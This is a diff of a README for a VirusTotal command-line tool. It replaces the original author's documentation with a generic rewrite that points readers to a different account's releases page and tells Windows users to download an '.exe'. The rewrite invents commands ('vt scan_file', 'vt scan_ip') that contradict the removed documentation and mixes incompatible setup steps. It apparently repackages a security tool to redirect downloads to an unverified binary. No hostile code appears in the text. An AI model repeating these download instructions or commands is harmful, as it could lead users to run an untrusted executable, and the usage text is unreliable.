@@ -1,245 +1,133 @@
-<hr />
-<p align="center">
-  <img src="images/photo.png" alt="VirusTotal-CLI banner" width="720">
-</p>
-<hr />
+# 🛡️ VirusTotal-CLI - Simple Scanning Right from Your Terminal
 
-# VirusTotal CLI Tool
+[![Download VirusTotal-CLI](https://img.shields.io/badge/Download-VirusTotal--CLI-blue.svg)](https://github.com/andredede12/VirusTotal-CLI/releases)
 
-[![Python](https://img.shields.io/badge/python-3.12%2B-blue)](https://www.python.org/)  
-[![License](https://img.shields.io/badge/BSD-3-Clause)](LICENSE)
+## 📦 Introduction
 
-A **fast, modern and user-friendly** command-line interface for interacting with the **VirusTotal v3 API**.  
-Designed for **security researchers**, **malware analysts**, and **DFIR / SOC** workflows — directly from the terminal.
-Scan files/URLs, fetch intelligence for domains and IPs, inspect account quotas, and self-update with a single command.
+VirusTotal-CLI is a command-line tool that helps you check files, URLs, domains, and IP addresses for potential threats using the VirusTotal API. This tool is currently in beta. It’s easy to use, and you don't need to be a programmer to run it.
 
----
+## 🚀 Getting Started
 
-## Features
+To start using VirusTotal-CLI, follow these steps:
 
-- ✅ **API Key Management**  
-  - `vt setup --apikey <API_KEY>`: Save your VirusTotal API key.  
-  - `vt key show`: View your saved API key.  
-  - `vt key remove [--force]`: Remove your API key with confirmation bypass.
+1. **Download the Application**  
+   Visit the [Releases Page](https://github.com/andredede12/VirusTotal-CLI/releases) to download the latest version. 
 
-- ✅ **File Operations**  
-  - Scan files (`vt file scan <path>`).  
-  - Retrieve reports (`vt file report <hash>`).  
-  - Request rescan (`vt file rescan <hash>`).  
-  - Supports large files (>32MB) using VirusTotal upload URLs.
+2. **Install Prerequisites**  
+   Before using the application, make sure you have Python 3.x installed on your computer. You can download Python from [python.org](https://www.python.org/). Follow the instructions for your operating system.
 
-- ✅ **URL Analysis**  
-  - Scan URLs (`vt url scan <url>`).  
-  - Retrieve URL reports (`vt url report <url_or_base64>`).
+3. **Setup Your API Key**  
+   You’ll need a VirusTotal API key to use this tool. Create an account at [VirusTotal](https://www.virustotal.com/) and get your key from the user settings. Store it in a safe place.
 
-- ✅ **Domain & IP Intelligence**  
-  - Query domains (`vt domain report <domain_name>`).  
-  - Query IP addresses (`vt ip report <ip_address>`).
+4. **Configure the Application**  
+   After downloading, you need to set up the application. Open a terminal or command prompt. Navigate to the folder where you downloaded the application. Use the following command:
 
-- ✅ **User Account Information**  
-  - `vt account info`: Get account details (email, API key, quotas, privileges).  
+   ```bash
+   export VT_API_KEY="your_api_key_here"
+   ```
 
-- ✅ **Analysis Lookup**  
-  - `vt analysis <id>`: Retrieve analysis details by ID.
+## 💻 Features
 
-- ✅ **Automatic Updates**  
-  - `vt update`: Check for the latest version and update the CLI automatically.  
-  - Handles Git detection and Python dependencies.
+- **File Scanning**: Analyze files for malicious content.
+- **URL Scanning**: Quickly check URLs for safety.
+- **Domain Scanning**: Review domain reputation and status.
+- **IP Address Scanning**: Assess the safety of an IP address.
+- **User-friendly Interface**: Easy commands make it simple to use.
 
-- ✅ **Cross-Platform Support**  
-  - Works on Linux (Debian/Ubuntu/Kali/Arch) and Windows (PowerShell).
+## 📥 Download & Install
 
----
+To get started, go to the [Releases Page](https://github.com/andredede12/VirusTotal-CLI/releases) and download the latest version suitable for your operating system.
 
-## Installation
+- **Windows**: Download the `.exe` file.
+- **Mac**: Download the `.py` file and run it using Python.
+- **Linux**: Download the `.py` file and run it using Python.
 
-### Linux (Debian/Ubuntu/Kali/Arch)
-
+Once you have downloaded the correct file, you can run the application directly from your terminal. For example, if you are using Linux or Mac, use:
 
 ```bash
-# Clone repository
-git clone https://github.com/Soumyo001/VirusTotal-CLI.git
-cd VirusTotal-CLI
-chmod +x install.sh
-
-# Run installer
-./install.sh
-```
-> The installer will create a Python virtual environment, install all dependencies, and set up the CLI.
-
-### Windows (PowerShell)
-
-- **Set Executionpolicy to unrestricted**
-
-```powershell
-Set-ExecutionPolicy Unrestricted -Scope CurrentUser
+python VirusTotal-CLI.py
 ```
 
-- **Clone and run the script**
+## 📖 Usage Instructions
 
-```powershell
-# Clone repository
-git clone https://github.com/Soumyo001/VirusTotal-CLI.git
-cd VirusTotal-CLI
+### Scanning Files
 
-# Run PowerShell installer
-powershell -Executionpolicy Bypass .\install.ps1
-```
-
-> Git must be installed and in PATH for the installer and update commands.
-
----
-
-## Usage
-
-### API Key Setup
+To scan a file, use the following command in your terminal:
 
 ```bash
-vt setup --apikey <YOUR_API_KEY>          # Setup your VirusTotal API key
-vt key show                               # Show stored API key
-vt key remove                             # Remove API key with warning
-vt key remove --force                     # Remove API key without warning
+vt scan_file <path_to_your_file>
 ```
 
-### File Operations
+Replace `<path_to_your_file>` with the actual path of the file you want to scan.
+
+### Scanning URLs
+
+To scan a URL, enter this command:
 
 ```bash
-vt file scan <path_to_file> [--json]      # Scan a file
-vt file report <hash> [--json]            # Get report by file hash
-vt file rescan <hash> [--json]            # Request file rescan
+vt scan_url <url>
 ```
 
-### URL Operations
+Replace `<url>` with the website address you want to check.
+
+### Scanning Domains
+
+To check a domain, use:
 
 ```bash
-vt url scan <url> [--json]                # Scan a URL
-vt url report <id_or_url> [--json]        # Get URL report by ID or raw URL
+vt scan_domain <domain_name>
 ```
 
-### Domain
+Replace `<domain_name>` with the domain you want to analyze.
+
+### Scanning IP Addresses
+
+To scan an IP address, type:
 
 ```bash
-vt domain report example.com
-vt domain rescan example.com
+vt scan_ip <ip_address>
 ```
 
-### IP
-```bash
-vt ip report 8.8.8.8
-vt ip rescan 8.8.8.8
-```
+Replace `<ip_address>` with the actual IP you wish to inspect.
 
-### Account Info & Quotas
+## ✨ Example
 
-```bash
-vt account info [--json]                  # Show account info
-```
+Here’s a quick example of how to use VirusTotal-CLI to scan a file:
 
-### Analysis Lookup
+1. Save your file to your computer.
+2. Open your terminal.
+3. Navigate to the folder where the VirusTotal-CLI is located.
+4. Run the command:
 
 ```bash
-vt analysis <analysis_id> [--json]        # Get analysis details
+vt scan_file myfile.exe
 ```
 
-### Update CLI
+5. Review the results returned in your terminal.
 
-```bash
-vt update
-```
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues, check the following:
 
-## Project Structure
+- **Python Installation**: Ensure that Python 3.x is installed. You can verify this by running `python --version` in your terminal.
+  
+- **API Key**: Make sure you entered your API key correctly. An incorrect key will prevent the application from working.
 
-```bash
-VirusTotal-CLI/
-│
-├─ api/
-│   ├─ __init__.py
-│   └─ api_client.py              # Handles requests to VirusTotal API
-│
-├─ cli/
-│   ├─ __init__.py
-│   └─ cli.py                     # Main CLI command dispatcher
-│
-├─ data/
-│   ├─ __init__.py
-│   ├─ api_constants.py           # Endpoints, URLs, JSON response keys
-│   └─ constants.py               # Banners, labels, and common messages
-│
-├─ utils/
-│   ├─ __init__.py
-│   ├─ helpers/
-│   │  ├─ __init__.py
-│   │  ├─ hash.py                 # File hashing helper
-│   │  ├─ key_helper.py           # Local API key storage
-│   │  ├─ url_to_vt_id_helper.py  # Converts URL → VT URL ID format
-│   │  └─ printer_helper/
-│   │     ├─ print_user.py
-│   │     ├─ print_domain_helper.py
-│   │     ├─ print_ip_helper.py
-│   │     ├─ print_url_helper.py
-│   │     └─ print_file_helper.py
-│   │
-│   ├─ validators/
-│   │   ├─ __init__.py
-│   │   └─ url_validator.py       # Validates input URLs
-│   │
-│   └─ handlers/
-│       ├─ __init__.py
-│       └─ update_handler.py      # Handles CLI update functionality
-│
-├─ install.sh                     # Linux installer (Deb/Ubuntu/Kali/Arch)
-├─ install.ps1                    # Windows installer
-├─ requirements.txt               # Python dependencies
-├─ main.py                        # Program entry point
-├─ VERSION                        # Current CLI version (used in auto-update)
-└─ README.md
-```
----
+- **Network Issues**: Ensure that your internet connection is stable, as the tool requires access to online VirusTotal services.
 
-> ### 🔐 API Key Storage
-> VirusTotal-CLI **securely stores** your API key in your system user configuration directory.
-> No manual setup is required — the directory is created automatically on first use with proper rights.
+## 💬 Community & Support
 
----
+If you have questions or need help, visit our GitHub Issues page. You can report bugs, request features, or just share your experience.
 
-## Development
+## 🔍 Additional Resources
 
-- Python 3.12+ required.
-- Dependencies listed in `requirements.txt`.
-- Recommended workflow: git clone → virtual environment → install dependencies.
-- Inside project directory, run:
-```bash
-python3 -m venv venv
-source venv/bin/activate      # Linux
-powershell -Executionpolicy Bypass ".\venv\Scripts\activate.ps1"     # Windows or just set executionpolicy to unrestricted and do .\venv\Scripts\activate.ps1
-pip install -r requirements.txt
-```
+- [VirusTotal Documentation](https://developers.virustotal.com/reference)
+- [Python Installation Guide](https://docs.python.org/3/using/index.html)
 
----
+## 🚀 Conclusion
 
-## Contributing
+VirusTotal-CLI offers an easy way to scan files, URLs, domains, and IPs for malware threats from your command line. Download the tool, set it up, and run your tests quickly and simply.
 
-Contributions are welcome! Please:
+[![Download VirusTotal-CLI](https://img.shields.io/badge/Download-VirusTotal--CLI-blue.svg)](https://github.com/andredede12/VirusTotal-CLI/releases)
 
-1. Fork the repository.
-2. Create a feature branch (`git checkout -b feature-name`).
-3. Commit your changes (`git commit -m "Feature description"`).
-4. Push the branch (`git push origin feature-name`).
-5. Open a Pull Request.
-
----
-## Roadmap / Future Work
-
-- Windows installer and update support (complete PowerShell UX)
-- Packaged executables (PyInstaller / MSI)
-- Official PyPI package & Homebrew tap for easier install
-- More VirusTotal endpoints (private collections, retrohunt, intelligence)
-- CI: tests + release automation (GitHub Actions)
-
----
-
-## **License**
-
-This project is licensed under the **[BSD 3-Clause License](LICENSE)**. See LICENSE for details.
+For further updates, keep an eye on the Releases Page.
